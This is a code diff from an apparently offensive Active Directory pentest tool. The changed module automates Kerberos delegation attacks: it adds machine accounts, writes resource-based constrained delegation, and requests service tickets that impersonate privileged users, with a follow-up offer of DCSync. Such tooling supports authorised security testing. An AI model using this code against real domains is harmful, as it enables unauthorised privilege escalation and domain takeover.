@@ -27,6 +27,7 @@ from adscan_internal import (
 )
 from adscan_internal.cli.common import build_lab_event_fields
 from adscan_internal.rich_output import (
+    mark_sensitive,
     print_exception,
 )
 from rich.prompt import Confirm
@@ -153,9 +154,7 @@ def do_enum_delegations(shell: DelegationShell, domain: str) -> None:
                         "resource_based_constrained_count": 0,
                         "unknown_count": 0,
                         "scan_mode": getattr(shell, "scan_mode", None),
-                        "auth_type": shell.domains_data[domain].get(
-                            "auth", "unknown"
-                        ),
+                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                         "workspace_type": shell.type,
                         "auto_mode": shell.auto,
                     }
@@ -331,9 +330,7 @@ def do_enum_delegations(shell: DelegationShell, domain: str) -> None:
                         ],
                         "unknown_count": delegation_type_counts["unknown"],
                         "scan_mode": getattr(shell, "scan_mode", None),
-                        "auth_type": shell.domains_data[domain].get(
-                            "auth", "unknown"
-                        ),
+                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                         "workspace_type": shell.type,
                         "auto_mode": shell.auto,
                     }
@@ -367,9 +364,7 @@ def do_enum_delegations(shell: DelegationShell, domain: str) -> None:
                         "unknown_count": 0,
                         "error": "structure_not_found",
                         "scan_mode": getattr(shell, "scan_mode", None),
-                        "auth_type": shell.domains_data[domain].get(
-                            "auth", "unknown"
-                        ),
+                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                         "workspace_type": shell.type,
                         "auto_mode": shell.auto,
                     }
@@ -477,7 +472,8 @@ def ask_for_exploit_delegation(
     marked_delegation_to = mark_sensitive(delegation_to, "service")
     marked_username = mark_sensitive(username, "user")
     respuesta = Confirm.ask(
-        f"Do you want to exploit the delegation {delegation_type} on {marked_delegation_to} for user {marked_username}?", default=True
+        f"Do you want to exploit the delegation {delegation_type} on {marked_delegation_to} for user {marked_username}?",
+        default=True,
     )
     if respuesta:
         if delegation_type.lower() == "constrained":
@@ -602,7 +598,9 @@ def execute_constrained(
                     "workspace_type": shell.type,
                     "auto_mode": shell.auto,
                 }
-                properties.update(build_lab_event_fields(shell=shell, include_slug=True))
+                properties.update(
+                    build_lab_event_fields(shell=shell, include_slug=True)
+                )
                 telemetry.capture("delegation_exploitation_success", properties)
             except Exception as e:
                 telemetry.capture_exception(e)
@@ -645,7 +643,9 @@ def execute_constrained(
                     "workspace_type": shell.type,
                     "auto_mode": shell.auto,
                 }
-                properties.update(build_lab_event_fields(shell=shell, include_slug=True))
+                properties.update(
+                    build_lab_event_fields(shell=shell, include_slug=True)
+                )
                 telemetry.capture("delegation_exploitation_failed", properties)
             except Exception as e:
                 telemetry.capture_exception(e)
@@ -798,8 +798,31 @@ def add_computer_to_domain(
 ) -> bool:
     """Adds a new computer to the domain."""
     try:
+        if domain not in shell.domains:
+            marked_target_domain = mark_sensitive(domain, "domain")
+            print_error(
+                f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
+            )
+            return None
+
+        if not shell.impacket_scripts_dir:
+            print_error(
+                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
+            )
+            return None
+
+        getaddcomputer_py_path = os.path.join(
+            shell.impacket_scripts_dir, "addcomputer.py"
+        )
+        if not os.path.isfile(getaddcomputer_py_path) or not os.access(
+            getaddcomputer_py_path, os.X_OK
+        ):
+            print_error(
+                f"addcomputer.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
+            )
+            return None
         auth = shell.build_auth_impacket_no_host(username, password, domain)
-        command = f"addcomputer.py -computer-name '{computer_name}$' -computer-pass '{computer_pass}' "
+        command = f"{getaddcomputer_py_path} -computer-name '{computer_name}$' -computer-pass '{computer_pass}' "
         command += f"-dc-host {shell.domains_data[domain]['pdc']} "
         command += f"{auth}"
 
@@ -829,36 +852,37 @@ def set_rbcd_delegation(
     password: str,
 ) -> bool:
     """Configures RBCD for the created computer."""
-    from adscan_internal.rich_output import mark_sensitive
     from adscan_internal.services.exploitation import ExploitationService
 
     try:
-        if not shell.impacket_scripts_dir:
-            print_error(
-                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
-            )
-            return
-        rbcd_path = os.path.join(shell.impacket_scripts_dir, "rbcd.py")
-        if not os.path.isfile(rbcd_path) or not os.access(rbcd_path, os.X_OK):
-            print_error(
-                f"rbcd.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
-            )
-            return
-        marked_username = mark_sensitive(username, "user")
+        _ = computer_pass  # reserved for future reuse/cleanup flows
         auth = shell.build_auth_impacket_no_host(username, password, domain)
-        command = f"{rbcd_path} -delegate-from '{computer_name}' -delegate-to '{marked_username}' "
-        command += f"-dc-ip {shell.domains_data[domain]['pdc']} -action 'write' "
-        command += f"{auth} -use-ldaps"
+        service = ExploitationService()
+        build_result = service.delegation.build_rbcd_write_command(
+            impacket_scripts_dir=shell.impacket_scripts_dir,
+            delegate_from=computer_name,
+            delegate_to=target,
+            dc_ip=shell.domains_data[domain]["pdc"],
+            auth=auth,
+        )
+        if not build_result.success or not build_result.command:
+            print_error(str(build_result.error_message or "Error configuring RBCD."))
+            return False
 
         print_success("Configuring RBCD")
-        service = ExploitationService()
-        success = service.delegation.run_rbcd_command(
-            command=command,
+        outcome = service.delegation.run_rbcd_command(
+            command=build_result.command,
             timeout=300,
         )
 
-        if success:
-            print_success("RBCD configured successfully")
+        if outcome.success:
+            if outcome.already_had_delegation:
+                print_success(
+                    "RBCD was already configured: this machine account already had "
+                    "the delegation privileges needed for this target (no changes were required)."
+                )
+            else:
+                print_success("RBCD configured successfully")
             return True
 
         print_error("Error configuring RBCD. Check logs for details.")
@@ -932,64 +956,316 @@ def create_forwardable_ticket(
 
 
 def launch_s4proxy(
-    shell: DelegationShell, domain: str, target: str, username: str, password: str
+    shell: DelegationShell,
+    domain: str,
+    target: str,
+    username: str,
+    password: str,
+    *,
+    prompt_for_dcsync_followup: bool = True,
 ) -> bool:
-    """Launches the S4Proxy attack with the forwardable ticket."""
+    """Launch the S4Proxy attack with the forwardable ticket."""
     from adscan_internal.services.exploitation import ExploitationService
 
+    setattr(shell, "_last_delegation_launch_result", None)
     try:
         # Get a privileged user that can be delegated
         target_user = shell.get_delegatable_privileged_user(domain)
         if not target_user:
+            setattr(
+                shell,
+                "_last_delegation_launch_result",
+                {
+                    "success": False,
+                    "target_spn": target,
+                    "target_user": None,
+                    "ticket_path": None,
+                    "error": "No privileged user found that can be delegated",
+                },
+            )
             print_error("No privileged user found that can be delegated")
             return False
 
         auth = shell.build_auth_impacket_no_host(username, password, domain)
-        # Remove trailing $ if present
-        if username.endswith("$"):
-            username = username.rstrip("$")
-        if not shell.impacket_scripts_dir:
-            print_error(
-                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
+        service = ExploitationService()
+        additional_ticket = (
+            f"{target_user}@browser_{shell.domains_data[domain]['pdc_hostname']}"
+            f".{domain}@{domain.upper()}.ccache"
+        )
+        build_result = service.delegation.build_s4proxy_command(
+            impacket_scripts_dir=shell.impacket_scripts_dir,
+            target_user=target_user,
+            target_spn=target,
+            additional_ticket=additional_ticket,
+            dc_ip=shell.domains_data[domain]["pdc"],
+            auth=auth,
+        )
+        if not build_result.success or not build_result.command:
+            setattr(
+                shell,
+                "_last_delegation_launch_result",
+                {
+                    "success": False,
+                    "target_spn": target,
+                    "target_user": target_user,
+                    "ticket_path": None,
+                    "error": str(
+                        build_result.error_message or "Error executing S4Proxy."
+                    ),
+                },
             )
+            print_error(str(build_result.error_message or "Error executing S4Proxy."))
             return False
-        get_st_path = os.path.join(shell.impacket_scripts_dir, "getST.py")
-        if not os.path.isfile(get_st_path) or not os.access(get_st_path, os.X_OK):
-            print_error(
-                f"getST.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
-            )
-            return False
-        command = f"{get_st_path} -impersonate '{target_user}' -spn '{target}' "
-        command += f"-additional-ticket '{target_user}@browser_{shell.domains_data[domain]['pdc_hostname']}.{domain}@{domain.upper()}.ccache' "
-        command += f"-dc-ip {shell.domains_data[domain]['pdc']} "
-        command += f"{auth}"
 
         print_success("Launching S4Proxy")
-        service = ExploitationService()
-        result = service.delegation.run_s4proxy_command(
-            command=command,
+        result = service.delegation.run_service_ticket_command(
+            command=build_result.command,
             timeout=300,
         )
 
-        if result.returncode == 0:
-            # Dynamically extract the .ccache file name from stdout
-            match = re.search(r"Saving ticket in (\S+)", result.stdout or "")
-            ticket = match.group(1) if match else None
+        if result.success:
+            ticket = result.ticket_path
+            setattr(
+                shell,
+                "_last_delegation_launch_result",
+                {
+                    "success": True,
+                    "target_spn": target,
+                    "target_user": target_user,
+                    "ticket_path": ticket,
+                },
+            )
 
             print_success("S4Proxy executed successfully")
-            if ticket:
+            if ticket and prompt_for_dcsync_followup:
                 shell.ask_for_dcsync(domain, target_user, ticket)
-            else:
+            elif not ticket:
                 print_warning(
                     "S4Proxy completed but could not parse ticket path from output."
                 )
             return True
 
-        print_error(f"Error executing S4Proxy: {result.stderr}")
+        setattr(
+            shell,
+            "_last_delegation_launch_result",
+            {
+                "success": False,
+                "target_spn": target,
+                "target_user": target_user,
+                "ticket_path": None,
+                "error": str(result.error_message or "").strip()
+                or "S4Proxy execution failed",
+            },
+        )
+        print_error(
+            f"Error executing S4Proxy: {result.error_message or 'unknown error'}"
+        )
         return False
 
     except Exception as e:
+        setattr(
+            shell,
+            "_last_delegation_launch_result",
+            {
+                "success": False,
+                "target_spn": target,
+                "target_user": None,
+                "ticket_path": None,
+                "error": str(e),
+            },
+        )
         telemetry.capture_exception(e)
         print_error("Error executing S4Proxy.")
         print_exception(show_locals=False, exception=e)
         return False
+
+
+def request_delegated_service_ticket(
+    shell: DelegationShell,
+    domain: str,
+    target_spn: str,
+    username: str,
+    password: str,
+    *,
+    force_forwardable: bool = True,
+) -> bool:
+    """Request a delegated service ticket directly via getST.py.
+
+    This is the preferred path for RBCD against computer targets. Unlike the
+    legacy S4Proxy wrapper, it does not depend on an intermediate browser/DC
+    ccache and instead asks Impacket directly for the final service ticket.
+    """
+    from adscan_internal.services.exploitation import ExploitationService
+
+    setattr(shell, "_last_delegation_launch_result", None)
+    setattr(
+        shell,
+        "_last_delegation_launch_context",
+        {
+            "domain": domain,
+            "target_spn": target_spn,
+            "username": username,
+            "password": password,
+            "force_forwardable": force_forwardable,
+        },
+    )
+    try:
+        target_user = shell.get_delegatable_privileged_user(domain)
+        if not target_user:
+            setattr(
+                shell,
+                "_last_delegation_launch_result",
+                {
+                    "success": False,
+                    "target_spn": target_spn,
+                    "target_user": None,
+                    "ticket_path": None,
+                    "error": "No privileged user found that can be delegated",
+                },
+            )
+            print_error("No privileged user found that can be delegated")
+            return False
+
+        auth = shell.build_auth_impacket_no_host(username, password, domain)
+        service = ExploitationService()
+        build_result = service.delegation.build_service_ticket_command(
+            impacket_scripts_dir=shell.impacket_scripts_dir,
+            target_user=target_user,
+            target_spn=target_spn,
+            auth=auth,
+            dc_ip=shell.domains_data[domain]["pdc"],
+            force_forwardable=force_forwardable,
+        )
+        if not build_result.success or not build_result.command:
+            error_message = str(
+                build_result.error_message or "Error requesting delegated service ticket."
+            )
+            setattr(
+                shell,
+                "_last_delegation_launch_result",
+                {
+                    "success": False,
+                    "target_spn": target_spn,
+                    "target_user": target_user,
+                    "ticket_path": None,
+                    "error": error_message,
+                },
+            )
+            print_error(error_message)
+            return False
+
+        marked_spn = mark_sensitive(target_spn, "service")
+        print_success(
+            f"Requesting delegated service ticket for {marked_spn}"
+        )
+        result = service.delegation.run_service_ticket_command(
+            command=build_result.command,
+            timeout=300,
+        )
+        setattr(
+            shell,
+            "_last_delegation_launch_result",
+            {
+                "success": result.success,
+                "target_spn": target_spn,
+                "target_user": target_user,
+                "ticket_path": result.ticket_path,
+                "error": result.error_message,
+            },
+        )
+        if result.success:
+            print_success("Delegated service ticket created successfully")
+            return True
+
+        print_error(
+            str(result.error_message or "Error requesting delegated service ticket.")
+        )
+        return False
+
+    except Exception as e:
+        setattr(
+            shell,
+            "_last_delegation_launch_result",
+            {
+                "success": False,
+                "target_spn": target_spn,
+                "target_user": None,
+                "ticket_path": None,
+                "error": str(e),
+            },
+        )
+        telemetry.capture_exception(e)
+        print_error("Error requesting delegated service ticket.")
+        print_exception(show_locals=False, exception=e)
+        return False
+
+
+def refresh_last_delegated_service_ticket(
+    shell: DelegationShell,
+    *,
+    current_ticket_path: str | None = None,
+) -> str | None:
+    """Recreate the most recent delegated service ticket and return its new path.
+
+    This is used by NetExec recovery logic when a delegated SMB session fails
+    with ``STATUS_MORE_PROCESSING_REQUIRED`` and ADscan still has the context
+    needed to mint a fresh ticket.
+    """
+    context = getattr(shell, "_last_delegation_launch_context", None)
+    if not isinstance(context, dict):
+        print_warning(
+            "ADscan cannot refresh this delegated ticket automatically because "
+            "the original delegation context is no longer available."
+        )
+        return None
+
+    previous_result = getattr(shell, "_last_delegation_launch_result", None)
+    previous_ticket_path = None
+    if isinstance(previous_result, dict):
+        previous_ticket_path = str(previous_result.get("ticket_path") or "").strip() or None
+
+    requested_ticket_path = str(current_ticket_path or "").strip() or None
+    if (
+        requested_ticket_path
+        and previous_ticket_path
+        and os.path.abspath(requested_ticket_path) != os.path.abspath(previous_ticket_path)
+    ):
+        print_warning(
+            "ADscan detected a delegated ticket mismatch and will not refresh "
+            "an unrelated Kerberos cache automatically."
+        )
+        return None
+
+    domain = str(context.get("domain") or "").strip()
+    target_spn = str(context.get("target_spn") or "").strip()
+    username = str(context.get("username") or "").strip()
+    password = str(context.get("password") or "")
+    force_forwardable = bool(context.get("force_forwardable", True))
+
+    if not domain or not target_spn or not username or not password:
+        print_warning(
+            "ADscan cannot refresh this delegated ticket because the saved "
+            "delegation context is incomplete."
+        )
+        return None
+
+    marked_spn = mark_sensitive(target_spn, "service")
+    print_info(
+        "Refreshing delegated service ticket for "
+        f"{marked_spn}."
+    )
+    success = request_delegated_service_ticket(
+        shell,
+        domain,
+        target_spn,
+        username,
+        password,
+        force_forwardable=force_forwardable,
+    )
+    if not success:
+        return None
+
+    refreshed_result = getattr(shell, "_last_delegation_launch_result", None)
+    if not isinstance(refreshed_result, dict):
+        return None
+    return str(refreshed_result.get("ticket_path") or "").strip() or None
